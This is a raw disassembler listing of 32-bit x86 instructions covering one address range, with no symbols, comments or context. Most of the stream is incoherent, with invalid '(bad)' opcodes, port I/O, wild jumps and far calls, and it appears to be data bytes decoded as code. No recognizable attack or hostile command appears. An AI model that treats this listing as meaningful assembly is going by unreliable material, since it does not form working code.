  40f377:	add    edi,DWORD PTR [ecx]
  40f379:	cmp    edi,0xd84be73
  40f37f:	or     BYTE PTR gs:[ebp+0xbb7e9fe],al
  40f386:	call   0x207f5c
  40f38b:	call   0x6328ff93
  40f390:	mov    esp,0xcd98c779
  40f395:	das    
  40f396:	jmp    0x40f3a7
  40f398:	inc    edi
  40f399:	push   ebx
  40f39a:	cmp    edi,ecx
  40f39c:	dec    eax
  40f39d:	clc    
  40f39e:	cmp    esi,eax
  40f3a0:	inc    edi
  40f3a1:	cld    
  40f3a2:	sub    ebx,ecx
  40f3a4:	mov    bl,0x0
  40f3a6:	sub    al,0x28
  40f3a8:	cmp    edx,edi
  40f3aa:	jg     0x40f341
  40f3ac:	push   0xe
  40f3ae:	or     ch,BYTE PTR [ecx-0x42]
  40f3b1:	enter  0xec76,0xba
  40f3b5:	xchg   edi,eax
  40f3b6:	das    
  40f3b7:	xchg   edx,eax
  40f3b8:	and    al,0x4
  40f3ba:	in     al,dx
  40f3bb:	sub    BYTE PTR [ebp+0xa909bf],dh
	...
  40f3d1:	add    BYTE PTR [eax],al
  40f3d3:	add    dl,bl
  40f3d5:	dec    DWORD PTR [ecx]
  40f3d7:	sub    eax,0x300b3870
  40f3dc:	sub    DWORD PTR [edx-0x5bbe9fa8],esi
  40f3e2:	(bad)  
  40f3e3:	aam    0xd2
  40f3e5:	jb     0x40f42b
  40f3e7:	dec    ecx
  40f3e8:	scas   eax,DWORD PTR es:[edi]
  40f3e9:	cmp    al,0xd8
  40f3eb:	jmp    0x6440f42a
  40f3f0:	jns    0x40f39e
  40f3f2:	dec    edi
  40f3f3:	ret    
  40f3f4:	cmp    eax,0x3a930016
  40f3f9:	push   ss
  40f3fa:	add    BYTE PTR [ebx+0x3544753a],dl
  40f400:	or     al,BYTE PTR [ebx+0x4095b614]
  40f406:	add    BYTE PTR [eax],al
  40f408:	stos   DWORD PTR es:[edi],eax
  40f409:	mov    edi,0xf8132272
  40f40e:	xlat   BYTE PTR ds:[ebx]
  40f40f:	add    BYTE PTR [ebx+ebx*4],bl
  40f412:	std    
  40f413:	jne    0x40f441
  40f415:	jp     0x40f48a
  40f417:	fcom   DWORD PTR [edi-0x12001c0d]
  40f41d:	addr16 std 
  40f41f:	jne    0x40f3b9
  40f421:	addr16 mov ebx,0xfd7d87fc
  40f427:	jne    0x40f3c1
  40f429:	fs xchg esi,eax
  40f42b:	and    BYTE PTR [eax-0x1],dl
  40f42e:	(bad)  
  40f42f:	jne    0x40f4a5
  40f431:	fs js  0x40f483
  40f434:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f435:	jge    0x40f434
  40f437:	jne    0x40f439
	...
  40f449:	add    BYTE PTR [eax],al
  40f44b:	add    BYTE PTR [eax-0x58b08f9c],ch
  40f451:	jge    0x40f450
  40f453:	jne    0x40f401
  40f455:	fs push 0x8b7cc74f
  40f45b:	inc    ebp
  40f45c:	mov    al,0xcc
  40f45e:	out    0x90,eax
  40f460:	dec    ebp
  40f461:	jge    0x40f460
  40f463:	pop    edi
  40f464:	inc    esi
  40f465:	inc    edi
  40f466:	ror    BYTE PTR [eax+eiz*1],0xd2
  40f46a:	mov    ch,ah
  40f46c:	mov    ds:0x106afac0,eax
  40f471:	jmp    0x871ef3ba
  40f476:	out    0x81,al
  40f478:	aam    0x7b
  40f47a:	std    
  40f47b:	mov    DWORD PTR [ebp-0x178a0286],ebx
  40f481:	data16 and ch,bh
  40f484:	daa    
  40f485:	jge    0x40f4ef
  40f487:	add    eax,0xff520278
  40f48c:	pop    ss
  40f48d:	mov    DWORD PTR [esi+0x67cec674],edi
  40f493:	idiv   DWORD PTR [ecx]
  40f495:	rol    BYTE PTR [ebx+0x0],cl
  40f498:	and    DWORD PTR [ecx+0x70efef02],ebx
  40f49e:	push   edi
  40f49f:	inc    ebp
  40f4a0:	clc    
  40f4a1:	cwde   
  40f4a2:	xor    bh,bh
  40f4a4:	and    al,0xa1
  40f4a6:	call   0x24e7:0x83920b3d
  40f4ad:	retf   0xfe84
	...
  40f4c4:	xchg   BYTE PTR [ebx],ch
  40f4c6:	mov    dh,bh
  40f4c8:	add    al,0xa1
  40f4ca:	call   0x7bc8:0x83b20587
  40f4d1:	xchg   esp,eax
  40f4d2:	add    dl,BYTE PTR [ebp-0x4e]
  40f4d5:	mov    ah,0x7f
  40f4d7:	ret    
  40f4d8:	pop    ebp
  40f4d9:	loope  0x40f4f4
  40f4db:	add    bl,ah
  40f4dd:	fiadd  DWORD PTR [esp+esi*2+0x4bd77141]
  40f4e4:	inc    esi
  40f4e5:	popa   
  40f4e6:	jns    0x40f52c
  40f4e8:	cmp    eax,0x618dc61d
  40f4ed:	fadd   DWORD PTR [ebx]
  40f4ef:	sub    BYTE PTR [esi-0x69],0xe
  40f4f3:	push   ecx
  40f4f4:	xchg   ecx,eax
  40f4f5:	jg     0x40f533
  40f4f7:	inc    ecx
  40f4f8:	cmp    edx,esp
  40f4fa:	fwait
  40f4fb:	jne    0x40f555
  40f4fd:	xchg   edi,eax
  40f4fe:	add    cl,BYTE PTR [ebx]
  40f500:	stc    
  40f501:	mov    ds:0xaf36eb00,eax
  40f506:	xchg   edx,eax
  40f507:	inc    ebp
  40f508:	js     0x40f4a1
  40f50a:	sub    ebp,eax
  40f50c:	pop    esp
  40f50d:	clc    
  40f50e:	add    eax,DWORD PTR [eax]
  40f510:	inc    edx
  40f511:	xlat   BYTE PTR ds:[ebx]
  40f512:	push   cs
  40f513:	and    ecx,DWORD PTR [esi-0x21a884d1]
  40f519:	retf   0xbff7
  40f51c:	dec    ebp
  40f51d:	mov    al,0x32
  40f51f:	push   0x94e90039
  40f524:	test   BYTE PTR [eax],bl
  40f526:	push   ds
  40f527:	cmp    eax,0x0
	...
  40f53c:	js     0x40f53e
  40f53e:	mov    ecx,0xf82d84
  40f543:	or     eax,0x9b05812a
  40f548:	fdiv   DWORD PTR [edx]
  40f54a:	inc    BYTE PTR [ebx+0x4a28cda2]
  40f550:	xchg   edi,eax
  40f551:	sub    ebp,0x20528883
  40f557:	or     ecx,DWORD PTR [ecx+edx*2]
  40f55a:	(bad)  
  40f55c:	add    BYTE PTR [ecx-0x69ef3a5],0x1c
  40f563:	sub    DWORD PTR [edi+0x21],0xffffffb0
  40f567:	inc    esi
  40f568:	cmp    al,BYTE PTR [eax]
  40f56a:	adc    al,0x8f
  40f56c:	push   edx
  40f56d:	jg     0x40f51b
  40f56f:	push   esp
  40f570:	dec    edi
  40f571:	sub    DWORD PTR [ebp+0x3883f591],0x9defcd83
  40f57b:	stc    
  40f57c:	xor    bl,BYTE PTR [eax+0x3924a4]
  40f582:	loop   0x40f5c7
  40f584:	aas    
  40f585:	jnp    0x40f542
  40f587:	add    eax,0xc9a60039
  40f58c:	es add cl,ch
  40f58f:	add    edi,DWORD PTR [ecx]
  40f591:	mov    ecx,0xf90f7423
  40f596:	call   0xd341889e
  40f59b:	add    edx,DWORD PTR [ebx+0x3c300]
	...
  40f5b1:	add    BYTE PTR [eax],al
  40f5b3:	add    ah,al
  40f5b5:	cmp    bl,BYTE PTR [ecx-0x2c]
  40f5b8:	mov    ebp,0xe77b387a
  40f5bd:	sbb    BYTE PTR [eax-0x779a7e],0x35
  40f5c4:	rol    BYTE PTR [edi+eiz*8+0x154f],1
  40f5cb:	bnd jp 0x40f5db
  40f5ce:	add    eax,0x3d10
  40f5d3:	jmp    0xa868907a
  40f5d8:	cmp    al,BYTE PTR [ecx-0x3fed268c]
  40f5de:	push   eax
  40f5df:	(bad)  
  40f5e0:	mov    ebx,0xa8198b30
  40f5e5:	jnp    0x40f5d6
  40f5e7:	idiv   BYTE PTR [ebx+0x153b4f81]
  40f5ed:	push   eax
  40f5ee:	push   eax
  40f5ef:	fidivr WORD PTR [ebx-0xc3a7b89]
  40f5f5:	cmp    esi,0xff3243c1
  40f5fb:	(bad)  
  40f5fc:	leave  
  40f5fd:	cmp    esi,esp
  40f5ff:	sbb    DWORD PTR [ebp+0x23],ecx
  40f602:	inc    edi
  40f603:	sub    BYTE PTR ds:0xd3bdb481,bh
  40f609:	cmp    esi,0xe7f441a6
  40f60f:	icebp  
  40f610:	gs cmp esi,0xf657c160
  40f617:	mov    es,WORD PTR [eax]
	...
  40f629:	add    BYTE PTR [eax],al
  40f62b:	add    BYTE PTR [ebx+0x1310ffe9],bh
  40f631:	mov    DWORD PTR [eax-0x17],0x7eebb4bb
  40f638:	mov    ebx,0x3ef4fe7e
  40f63d:	push   0x7ebbb9ec
  40f642:	mov    BYTE PTR [edx+edx*4+0x76],ah
  40f646:	(bad)  
  40f647:	push   esi
  40f648:	in     al,0x7f
  40f64a:	data16 fadd DWORD PTR [ebx]
  40f64d:	sar    edi,0xff
  40f650:	jg     0x40f60a
  40f652:	jmp    0xdc75:0xfd821ff7
  40f659:	jmp    0x40f62b
  40f65b:	push   eax
  40f65c:	pop    ds
  40f65d:	add    BYTE PTR [edi-0x205cb7b],0xff
  40f664:	dec    ebp
  40f665:	mov    dl,dl
  40f667:	test   DWORD PTR [edi-0x7e],0x4a19684e
  40f66e:	aas    
  40f66f:	add    BYTE PTR [edi],bh
  40f671:	mov    eax,0x819ff7ea
  40f676:	std    
  40f677:	jne    0x40f615
  40f679:	jmp    0x40f62b
  40f67b:	push   eax
  40f67c:	lahf   
  40f67d:	or     DWORD PTR [ecx],0x831ae4c0
  40f683:	mov    ebp,0xfffdf9c4
  40f688:	fs jbe 0x40f699
  40f68b:	call   DWORD PTR [eax-0x6f]
  40f68e:	and    eax,0x0
	...
  40f6a1:	add    BYTE PTR [eax],al
  40f6a3:	add    BYTE PTR [edi-0x77af027f],ah
  40f6a9:	add    DWORD PTR [ebp-0x1],ecx
  40f6ac:	(bad)  
  40f6ad:	in     eax,dx
  40f6ae:	adc    cl,BYTE PTR [ebx]
  40f6b0:	mov    al,ds:0xa8500478
  40f6b5:	jne    0x40f702
  40f6b7:	call   FWORD PTR [edi-0x281f7c37]
  40f6bd:	cmp    ch,0x15
  40f6c0:	and    BYTE PTR [ebx],al
  40f6c2:	add    BYTE PTR [edx+0x10],ch
  40f6c5:	imul   esi,DWORD PTR [esi+0x47],0x51
  40f6c9:	add    al,0xff
  40f6cb:	mov    ch,0xbc
  40f6cd:	clc    
  40f6ce:	std    
  40f6cf:	call   FWORD PTR [edi-0x1317f589]
  40f6d5:	push   edx
  40f6d6:	std    
  40f6d7:	dec    DWORD PTR [ecx+0x39f7da87]
  40f6dd:	(bad)  
  40f6de:	sub    BYTE PTR [ecx+0x39],0x41
  40f6e2:	xchg   esi,eax
  40f6e3:	inc    esi
  40f6e4:	js     0x40f74f
  40f6e6:	jg     0x40f69c
  40f6e8:	int    0x35
  40f6ea:	cmp    esi,0xe80ebbd6
  40f6f0:	push   0xb0fe7f99
  40f6f5:	jmp    0x40f74a
  40f6f7:	idiv   BYTE PTR [esi-0x6e437ae3]
  40f6fd:	sbb    eax,0x5e39fe81
  40f702:	xchg   BYTE PTR [ebx+0x68026939],dl
	...
  40f71c:	mov    esi,0xc5ffc1a5
  40f721:	stos   DWORD PTR es:[edi],eax
  40f722:	jbe    0x40f773
  40f724:	mov    ?,WORD PTR [ebx]
  40f726:	pop    esp
  40f727:	test   BYTE PTR [esi+0xb6b6a65],0x5e
  40f72e:	jg     0x40f73a
  40f730:	jns    0x40f70e
  40f732:	inc    DWORD PTR [edx+0x740254ec]
  40f738:	out    dx,eax
  40f739:	jmp    0xbda7dafb
  40f73e:	jg     0x40f73f
  40f740:	retf   0x84c3
  40f743:	mov    esp,0xfe7fb561
  40f748:	cmp    DWORD PTR ds:0x692967e8,ebx
  40f74e:	outs   dx,DWORD PTR ds:[esi]
  40f74f:	mov    ebp,0xe80c1d36
  40f754:	stos   DWORD PTR es:[edi],eax
  40f755:	and    BYTE PTR [ecx+0x6b3d26fe],al
  40f75b:	neg    BYTE PTR [esi]
  40f75d:	(bad)  
  40f75e:	jg     0x40f7d4
  40f760:	inc    ecx
  40f761:	jg     0x40f7ab
  40f763:	dec    eax
  40f764:	push   cs
  40f765:	out    dx,eax
  40f766:	jg     0x40f71c
  40f768:	sbb    eax,0xff805e01
  40f76d:	jge    0x40f742
  40f76f:	or     esp,ecx
  40f771:	mov    eax,0x7def809f
  40f776:	shl    DWORD PTR [edi-0x19],cl
  40f779:	mov    bl,0x20
  40f77b:	js     0x40f75c
  40f77d:	jge    0x40f7bc
  40f77f:	test   BYTE PTR [eax],0x0
	...
  40f792:	add    BYTE PTR [eax],al
  40f794:	ds push 0x7dcfcab1
  40f79a:	sub    eax,0x2575e6b6
  40f79f:	cmp    BYTE PTR [edi+0x6f6bf0f3],0xc7
  40f7a6:	adc    eax,0x2cb3af80
  40f7ab:	js     0x40f754
  40f7ad:	jge    0x40f7b4
  40f7af:	div    BYTE PTR [esi]
  40f7b1:	push   0x7d97ca71
  40f7b6:	cmc    
  40f7b7:	mov    ch,0x7e
  40f7b9:	jne    0x40f7a8
  40f7bb:	jg     0x40f744
  40f7bd:	repz lock imul edi,ebp,0xffffffc6
  40f7c2:	fnstsw WORD PTR [edi+0x77]
  40f7c5:	mov    bl,0xb0
  40f7c7:	ja     0x40f838
  40f7c9:	jge    0x40f78b
  40f7cb:	xchg   edx,esi
  40f7cd:	jl     0x40f794
  40f7cf:	jg     0x40f776
  40f7d1:	push   0x68577fb5
  40f7d6:	xor    al,0xd0
  40f7d8:	dec    edi
  40f7d9:	jge    0x40f788
  40f7db:	mov    ecx,0x7fa57562
  40f7e0:	push   esi
  40f7e1:	out    dx,eax
  40f7e2:	sub    al,0x7f
  40f7e4:	aaa    
  40f7e5:	jge    0x40f842
  40f7e7:	push   0x6c8d7d27
  40f7ec:	pushf  
  40f7ed:	int3   
  40f7ee:	test   DWORD PTR [edi+0x1f],edi
  40f7f1:	mov    bl,0x98
  40f7f3:	ja     0x40f80c
  40f7f5:	jge    0x40f7f6
  40f7f7:	add    BYTE PTR [eax],0x0
	...
  40f80a:	add    BYTE PTR [eax],al
  40f80c:	repnz enter 0x6efe,0x86
  40f811:	mov    ah,0xeb
  40f813:	pop    esi
  40f814:	jle    0x40f894
  40f816:	(bad)  
  40f817:	aam    0x46
  40f819:	jge    0x40f88f
  40f81b:	loope  0x40f87f
  40f81d:	inc    ebx
  40f81e:	cld    
  40f81f:	dec    esi
  40f820:	data16 jle 0x40f7d7
  40f823:	push   ebp
  40f824:	data16 jle 0x40f825
  40f827:	push   ecx
  40f828:	push   ss
  40f829:	int3   
  40f82a:	(bad)  
  40f82b:	ss dec esi
  40f82d:	(bad)  
  40f82e:	test   DWORD PTR [eax+0x63],0x3e26fe7c
  40f835:	hlt    
  40f836:	sti    
  40f837:	adc    esp,eax
  40f839:	sbb    al,BYTE PTR [eax]
  40f83b:	jmp    0xe94c373d
  40f840:	or     DWORD PTR [ecx+0x60f16aeb],0xcd16a48c
  40f84a:	addr16 mov eax,ds:0xbf77
  40f84e:	inc    DWORD PTR [eax-0x16bf3acb]
  40f854:	push   ebx
  40f856:	or     edx,ecx
  40f858:	pop    ds
  40f859:	int    0xfe
  40f85b:	(bad)  
  40f85c:	inc    ebx
  40f85d:	inc    eax
  40f85e:	jae    0x40f8a2
  40f860:	lea    eax,[ecx-0xcc93a84]
  40f866:	pop    esi
  40f867:	mov    esi,0xb1448d0a
  40f86c:	mov    ch,0xfb
  40f86e:	div    DWORD PTR [ebp+0x0]
	...
  40f884:	cmp    eax,0x361f0000
  40f889:	inc    ebp
  40f88a:	inc    esp
  40f88b:	mov    eax,ds:0xe90000ae
  40f890:	mov    ds:0xa514fec1,eax
  40f895:	jecxz  0x40f8e8
  40f897:	add    BYTE PTR [edi+0x45],cl
  40f89a:	dec    BYTE PTR [ebp+ebx*2-0x317b118]
  40f8a1:	sbb    eax,0xc3930000
  40f8a6:	or     ch,BYTE PTR [edx+0x10]
  40f8a9:	xchg   ecx,eax
  40f8aa:	inc    ebx
  40f8ab:	in     al,0xb0
  40f8ad:	addr16 pop es
  40f8af:	inc    edi
  40f8b0:	mov    eax,ds:0x475feff
  40f8b5:	call   0xfab84796
  40f8ba:	or     eax,eax
  40f8bc:	mov    WORD PTR [ebx],ss
  40f8be:	push   eax
  40f8bf:	push   0xbeeeffe1
  40f8c4:	mov    al,ds:0x280873fa
  40f8c9:	mov    al,ds:0xe757ff6b
  40f8ce:	lods   al,BYTE PTR ds:[esi]
  40f8cf:	dec    ebx
  40f8d0:	inc    edi
  40f8d1:	cli    
  40f8d2:	std    
  40f8d3:	dec    ebp
  40f8d4:	dec    eax
  40f8d5:	jle    0x40f952
  40f8d7:	clc    
  40f8d8:	nop
  40f8d9:	js     0x40f891
  40f8db:	call   0x3e3ee0
  40f8e0:	pop    ecx
  40f8e1:	rol    DWORD PTR [esi],0x0
  40f8e4:	lods   eax,DWORD PTR ds:[esi]
  40f8e5:	xchg   dl,ch
  40f8e7:	add    DWORD PTR [eax],0x0
	...
  40f8fa:	add    BYTE PTR [eax],al
  40f8fc:	int3   
  40f8fd:	sub    BYTE PTR [eax+0x0],0xa
  40f901:	inc    ebp
  40f902:	std    
  40f903:	jne    0x40f95d
  40f905:	out    0xc0,eax
  40f907:	dec    eax
  40f908:	ja     0x40f907
  40f90a:	xchg   DWORD PTR [ebp+0x74],eax
  40f90d:	ins    BYTE PTR es:[edi],dx
  40f90e:	and    eax,0xff042147
  40f913:	xor    eax,0x41270d
  40f918:	xchg   edi,eax
  40f919:	jae    0x40f921
  40f91b:	call   0x3e79c0
  40f920:	dec    eax
  40f921:	and    eax,0x69394147
  40f926:	jmp    0xa4fe:0x82693901
  40f92d:	jno    0x40f999
  40f92f:	fst    QWORD PTR ds:0x44fe7cfa
  40f935:	jl     0x40f960
  40f937:	inc    ecx
  40f938:	cmp    edx,ebp
  40f93a:	test   BYTE PTR [edi],0x11
  40f93d:	adc    BYTE PTR [ebp-0x2],bh
  40f940:	not    BYTE PTR [eax+0x0]
  40f943:	add    BYTE PTR [ecx],bh
  40f945:	jmp    0xc1726dc6
  40f94a:	pop    ds
  40f94b:	(bad)  
  40f94c:	faddp  st(1),st
  40f94e:	jl     0x40f9c4
  40f950:	aad    0x39
  40f952:	test   DWORD PTR [edi],0xfecbeee1
  40f958:	(bad)  
  40f959:	pop    ds
  40f95a:	inc    edx
  40f95b:	add    edi,DWORD PTR [ecx]
  40f95d:	mov    esp,0xeb87
	...
  40f972:	add    BYTE PTR [eax],al
  40f974:	mov    edx,0x6556024
  40f979:	jg     0x40f97d
  40f97b:	push   0xfffffff1
  40f97d:	or     edi,esi
  40f97f:	pop    es
  40f980:	xchg   ecx,eax
  40f981:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f982:	retf   0x96fe
  40f985:	out    dx,eax
  40f986:	(bad)  
  40f987:	sti    
  40f988:	mov    edx,0xf82f17b3
  40f98d:	push   0xb3b50f02
  40f992:	add    DWORD PTR [eax],eax
  40f994:	cmp    esi,esp
  40f996:	cmp    eax,0x4281e1f
  40f99b:	add    BYTE PTR [esi],dh
  40f99d:	in     eax,0x42
  40f99f:	add    BYTE PTR [ecx],bh
  40f9a1:	imul   edi,DWORD PTR [edi+0x3c],0xffc30a1e
  40f9a8:	dec    esi
  40f9a9:	popa   
  40f9aa:	xchg   BYTE PTR [edx-0x7cfd96c8],dh
  40f9b0:	cld    
  40f9b1:	call   DWORD PTR [ecx-0x16ff87d3]
  40f9b7:	or     al,0xb5
  40f9b9:	mov    ds:0x7d3903e7,al
  40f9be:	retf   
  40f9bf:	ins    BYTE PTR es:[edi],dx
  40f9c0:	dec    esp
  40f9c1:	mov    edi,0x844603e8
  40f9c6:	pop    edi
  40f9c7:	add    bh,BYTE PTR [ecx]
  40f9c9:	add    BYTE PTR [edx+0x3e],ch
  40f9cc:	or     ch,BYTE PTR [ebx]
  40f9ce:	sub    BYTE PTR [ecx+edi*1],al
  40f9d1:	or     DWORD PTR [ebp-0x71],ebp
  40f9d4:	cmp    DWORD PTR [eax],eax
  40f9d6:	jmp    0x40fa5b
	...
  40f9eb:	add    BYTE PTR ds:0xe6c30671,ch
  40f9f1:	jns    0x40f9d0
  40f9f3:	xchg   DWORD PTR [edi-0x1],ebx
  40f9f6:	call   0xa7cb3fe
  40f9fb:	sub    eax,0xce90078
  40fa00:	mov    ebp,0x3903e7ee
  40fa05:	call   0x3abe67
  40fa0a:	xchg   edx,eax
  40fa0b:	add    ebp,DWORD PTR [esi-0x7d30ded]
  40fa11:	call   FWORD PTR [edi-0x3a]
  40fa14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa15:	jge    0x40f99a
  40fa17:	jnp    0x40f9af
  40fa19:	or     ah,BYTE PTR [ebp-0x25]
  40fa1c:	cmp    DWORD PTR [eax],eax
  40fa1e:	jmp    0xee13894b
  40fa23:	cmc    
  40fa24:	xchg   BYTE PTR [ecx-0x5],bh
  40fa27:	sbb    ah,BYTE PTR [esi]
  40fa29:	mov    edi,0x55e8ee8
  40fa2e:	fcomip st,st(1)
  40fa30:	cmp    eax,0x39051667
  40fa35:	add    BYTE PTR [edx-0x2e],dh
  40fa38:	inc    edx
  40fa39:	test   DWORD PTR [edx],esi
  40fa3b:	in     al,dx
  40fa3c:	ret    
  40fa3d:	idiv   bh
  40fa3f:	inc    esp
  40fa40:	mov    ah,0xcc
  40fa42:	repz loop 0x40fa08
  40fa45:	or     DWORD PTR [esp+eax*1-0x6fffffc4],eax
  40fa4c:	inc    ebx
  40fa4d:	(bad)  
  40fa4e:	(bad)  
  40fa4f:	call   0x40fa54
	...
  40fa64:	adc    dh,BYTE PTR [edi+0x79352846]
  40fa6a:	ss xchg ecx,eax
  40fa6c:	pop    esp
  40fa6d:	sbb    al,0x0
  40fa6f:	jmp    0x6c4f3ab3
  40fa74:	mov    DWORD PTR [ecx-0x2],edi
  40fa77:	jmp    0xe948f433
  40fa7c:	inc    ebx
  40fa7d:	test   cl,ch
  40fa7f:	jmp    0xdf3ffabe
  40fa84:	xor    ch,BYTE PTR [eax+0x5f]
  40fa87:	mov    ds:0xac887a63,eax
  40fa8c:	dec    edx
  40fa8d:	jp     0x40fb05
  40fa8f:	icebp  
  40fa90:	push   ebx
  40fa91:	hlt    
  40fa92:	out    dx,eax
  40fa93:	ss retf 0xe804
  40fa97:	addr16 out dx,eax
  40fa99:	jns    0x40fa99
  40fa9b:	xchg   ecx,eax
  40fa9c:	jbe    0x40fa60
  40fa9e:	inc    eax
  40fa9f:	jmp    0x230eed7
  40faa4:	adc    al,0x16
  40faa6:	add    cl,ch
  40faa8:	das    
  40faa9:	inc    eax
  40faaa:	push   cs
  40faab:	ins    BYTE PTR es:[edi],dx
  40faac:	leave  
  40faad:	js     0x40faad
  40faaf:	jmp    0xaccc7350
  40fab4:	adc    cl,cl
  40fab6:	mov    WORD PTR [esi+edx*1+0x64e969c9],fs
  40fabd:	js     0x40fb13
  40fabf:	fimul  WORD PTR [ecx+0x21]
  40fac2:	das    
  40fac3:	sub    BYTE PTR ds:0xdec005,bh
	...
  40fad9:	add    BYTE PTR [eax],al
  40fadb:	add    dh,bl
  40fadd:	xchg   ecx,eax
  40fade:	(bad)  
  40fadf:	jmp    DWORD PTR [eax-0x4]
  40fae2:	mov    WORD PTR [ebp+0x74],es
  40fae5:	dec    esp
  40fae6:	std    
  40fae7:	jne    0x40fb61
  40fae9:	cmc    
  40faea:	jae    0x40fad8
  40faec:	(bad)  
  40faed:	por    mm5,QWORD PTR [esi]
  40faf0:	popa   
  40faf1:	cld    
  40faf2:	or     al,al
  40faf4:	inc    esp
  40faf5:	je     0x40fa82
  40faf7:	inc    ebp
  40faf8:	mov    al,0x53
  40fafa:	push   0x69fc3a00
  40faff:	pop    es
  40fb00:	sub    bh,ah
  40fb02:	(bad)  
  40fb03:	jne    0x40fab9
  40fb05:	cli    
  40fb06:	adc    ebp,edi
  40fb08:	(bad)  
  40fb09:	cmp    al,0xfe
  40fb0b:	or     dl,al
  40fb0d:	addr16 push esp
  40fb0f:	call   DWORD PTR ds:0xa9e8e6e4
  40fb15:	cli    
  40fb16:	std    
  40fb17:	mov    DWORD PTR [ebp+0x70458bcf],edx
  40fb1d:	push   ebx
  40fb1e:	std    
  40fb1f:	jne    0x40fb3d
  40fb21:	gs (bad) 
  40fb23:	imul   edx,edi,0x85fefe65
  40fb29:	xlat   BYTE PTR ds:[ebx]
  40fb2a:	std    
  40fb2b:	adc    eax,0x4128ff
  40fb30:	stos   DWORD PTR es:[edi],eax
  40fb31:	ret    
  40fb32:	jb     0x40fb5d
  40fb34:	enter  0x3,0xef
  40fb38:	push   cs
  40fb39:	cli    
  40fb3a:	jae    0x40fb44
  40fb3c:	cmp    BYTE PTR [ebx],dh
  40fb3e:	inc    esi
  40fb3f:	inc    DWORD PTR [eax]
	...
  40fb51:	add    BYTE PTR [eax],al
  40fb53:	add    BYTE PTR [edi],bh
  40fb55:	cli    
  40fb56:	je     0x40fb60
  40fb58:	(bad)  
  40fb59:	jo     0x40fb5d
  40fb5b:	inc    DWORD PTR ds:0xd658e80b
  40fb61:	cli    
  40fb62:	std    
  40fb63:	call   DWORD PTR ds:0xac75fddc
  40fb69:	stc    
  40fb6a:	jae    0x40fb74
  40fb6c:	cmp    DWORD PTR [ecx-0x33],eax
  40fb6f:	inc    ebp
  40fb70:	pop    esi
  40fb71:	inc    esi
  40fb72:	js     0x40fbe8
  40fb74:	jne    0x40fbc7
  40fb76:	test   BYTE PTR [eax+0x4e],cl
  40fb79:	mov    dh,0x78
  40fb7b:	je     0x40fbda
  40fb7d:	scas   al,BYTE PTR es:[edi]
  40fb7e:	push   cs
  40fb7f:	repz (bad)
  40fb82:	add    al,0x6a
  40fb84:	cmp    DWORD PTR [esi+0x6c2eebee],ebx
  40fb8a:	outs   dx,DWORD PTR ds:[esi]
  40fb8b:	sub    eax,0x74776978
  40fb90:	sub    DWORD PTR [ecx+0x7e1648e0],eax
  40fb96:	test   dh,al
  40fb98:	sub    esi,esi
  40fb9a:	(bad)  
  40fb9b:	repz mov edx,0x2fff6e6b
  40fba1:	fsubr  QWORD PTR [ebx-0x3]
  40fba4:	neg    ch
  40fba6:	push   0xffffffb4
  40fba8:	out    dx,eax
  40fba9:	aad    0x78
  40fbab:	imul   edi,DWORD PTR [ecx],0xdef7eece
  40fbb1:	imul   esp,DWORD PTR [ebx],0x2f
  40fbb4:	js     0x40fc1f
  40fbb6:	ja     0x40fc2c
	...
  40fbcc:	int    0x35
  40fbce:	out    dx,eax
  40fbcf:	pop    es
  40fbd0:	shl    edx,1
  40fbd2:	sar    esi,0xbe
  40fbd5:	test   eax,ebx
  40fbd7:	enter  0x647b,0x2
  40fbdb:	push   ebp
  40fbdc:	ret    0x8304
  40fbdf:	ret    
  40fbe0:	test   DWORD PTR ds:0x9bacfe79,edx
  40fbe6:	jbe    0x40fc37
  40fbe8:	xchg   esi,eax
  40fbe9:	repz push es
  40fbeb:	inc    DWORD PTR [esp+ebp*8+0x29]
  40fbef:	inc    ecx
  40fbf0:	cmp    DWORD PTR [ecx],eax
  40fbf2:	std    
  40fbf3:	sbb    bh,BYTE PTR [ecx]
  40fbf5:	imul   ecx,DWORD PTR [ebx],0x6c0046c0
  40fbfb:	test   al,0x39
  40fbfd:	add    cl,ch
  40fbff:	inc    eax
  40fc00:	std    
  40fc01:	ja     0x40fbeb
  40fc03:	add    edi,DWORD PTR [ecx]
  40fc05:	add    BYTE PTR [esi-0x1289b542],ah
  40fc0b:	add    edi,DWORD PTR [ecx]
  40fc0d:	jmp    0xede8:0xe846ede8
  40fc14:	and    DWORD PTR ds:[ebx],0x70
  40fc18:	xchg   BYTE PTR [ebx+0x76276f6b],al
  40fc1e:	popf   
  40fc1f:	shl    DWORD PTR [edi],cl
  40fc21:	in     al,dx
  40fc22:	nop
  40fc23:	js     0x40fbca
  40fc25:	je     0x40fba7
  40fc27:	(bad)  
  40fc28:	xor    eax,DWORD PTR [eax]
  40fc2a:	jmp    0xe42df53b
  40fc2f:	push   0x0
	...
  40fc41:	add    BYTE PTR [eax],al
  40fc43:	add    BYTE PTR [eax-0x6efc1701],cl
  40fc49:	pop    esi
  40fc4a:	rol    dl,0xf6
  40fc4d:	jbe    0x40fc2a
  40fc4f:	pop    es
  40fc50:	loope  0x40fc42
  40fc52:	lods   al,BYTE PTR ds:[esi]
  40fc53:	js     0x40fc3c
  40fc55:	shl    BYTE PTR [ecx+0x53],1
  40fc58:	lods   eax,DWORD PTR ds:[esi]
  40fc59:	jnp    0x40fcaf
  40fc5b:	jo     0x40fc34
  40fc5d:	jne    0x40fbf7
  40fc5f:	aad    0xd6
  40fc61:	loopne 0x40fc0f
  40fc63:	js     0x40fc2c
  40fc65:	xchg   DWORD PTR [ebx+0x57],ebp
  40fc68:	(bad)  
  40fc69:	jne    0x40fc98
  40fc6b:	imul   ebp,esp,0xffffffc8
  40fc6e:	and    eax,0x91002078
  40fc73:	jae    0x40fc74
  40fc75:	mov    esi,0x54e578e8
  40fc7a:	adc    eax,0xbb759778
  40fc7f:	out    dx,al
  40fc80:	popa   
  40fc81:	mov    edi,0xc9cc6be8
  40fc86:	push   ebp
  40fc88:	push   es
  40fc89:	mov    BYTE PTR [ecx+edi*8+0x53fe75e6],al
  40fc90:	xor    eax,0x7c26f4e8
  40fc95:	jne    0x40fc94
  40fc97:	pushf  
  40fc98:	add    DWORD PTR [esi-0x2],ebp
  40fc9b:	into   
  40fc9c:	into   
  40fc9d:	sub    esi,DWORD PTR [ebp+0x10]
  40fca0:	je     0x40fd17
  40fca2:	out    0x61,al
  40fca4:	jb     0x40fd1c
  40fca6:	(bad)  
  40fca7:	pusha  
	...
  40fcbc:	mov    eax,0xaeaef669
  40fcc1:	out    0xff,eax
